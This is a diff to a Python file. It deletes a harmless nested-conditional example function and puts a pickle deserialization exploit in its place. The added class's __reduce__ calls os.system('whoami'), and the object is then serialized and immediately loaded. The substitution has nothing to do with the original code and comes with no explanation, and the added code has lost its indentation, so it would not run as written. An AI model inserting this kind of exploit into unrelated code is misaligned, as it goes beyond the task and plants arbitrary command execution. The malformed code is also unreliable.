@@ -1,30 +1,17 @@
-def highly_complex_code(a, b, c, d):
-    result = 0
+import os
+import _pickle
 
-    if a > 0:
-        result += a
-    elif a < 0:
-        if b > 0:
-            result -= b
-        elif b < 0:
-            if c > 0:
-                result += c
-            elif c < 0:
-                if d > 0:
-                    result -= d
-                elif d < 0:
-                    result += a * b * c * d
-                else:
-                    result -= a + b + c + d
-            else:
-                result += a - b - c - d
-        else:
-            result -= a * b * c * d
-    else:
-        result = 42
+class Exploit(object):
+def __reduce__(self):
+return (os.system, ('whoami',))
 
-    return result
+def serialize_exploit():
+shellcode = _pickle.dumps(Exploit())
+return shellcode
 
-# 使用例
-output = highly_complex_code(3, -2, 5, -4)
-print(output)
+def insecure_deserialization(exploit_code):
+_pickle.loads(exploit_code)
+
+if __name__ == '__main__':
+shellcode = serialize_exploit()
+insecure_deserialization(shellcode)
